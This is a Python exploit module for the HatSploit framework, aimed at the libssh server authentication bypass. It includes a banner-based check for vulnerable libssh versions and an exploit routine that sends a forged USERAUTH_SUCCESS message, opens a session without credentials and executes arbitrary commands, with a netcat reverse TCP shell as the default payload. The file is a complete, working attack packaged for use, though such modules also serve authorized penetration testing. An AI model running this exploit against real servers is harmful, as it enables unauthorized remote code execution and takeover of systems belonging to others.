"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import paramiko

from hatsploit.lib.module.basic import *
from hatsploit.lib.module.proto import TCP


class HatSploitModule(Module, Handler, TCP):
    def __init__(self):
        super().__init__()

        self.buffer_size = 2048
        self.client = None

        self.details.update({
            'Category': "exploit",
            'Name': "SSH LibSSH Code Execution",
            'Module': "exploit/linux/ssh/libssh_code_execution",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
                'Peter Winter-Smith (peterwintersmith) - vulnerability researcher',
            ],
            'Description': "SSH LibSSH unauthorized access Remote Code Execution.",
            'Platform': OS_LINUX,
            'Rank': "medium",
            'Payload': {
                'Value': "unix/generic/netcat_reverse_tcp",
                'Platforms': [OS_LINUX, OS_UNIX],
            }
        })

        self.port.set(2222)

    def exploit(self, command):
        client = self.open_tcp()
        client.connect()

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(client.sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        conn = transport.open_session(timeout=5)
        conn.exec_command(command)

        output = conn.makefile("rb", 4096)
        output = output.read()

        return output.decode()

    def check(self):
        try:
            sock = self.open_tcp()
            banner = sock.recv(self.buffer_size)
            sock.close()

            banner = banner.split(b'\n')[0].decode().strip()
        except Exception:
            banner = None

        if banner:
            if any(version in banner for version in ['libssh-0.6', 'libssh_0.6']):
                return True
            if any(version in banner for version in ['libssh-0.7', 'libssh_0.7']):
                if int(banner.split('.')[-1]) < 6:
                    return True
            if any(version in banner for version in ['libssh-0.8', 'libssh_0.8']):
                if int(banner.split('.')[-1]) < 4:
                    return True

        return False

    def run(self):
        self.module_handle(
            sender=self.exploit,
        )
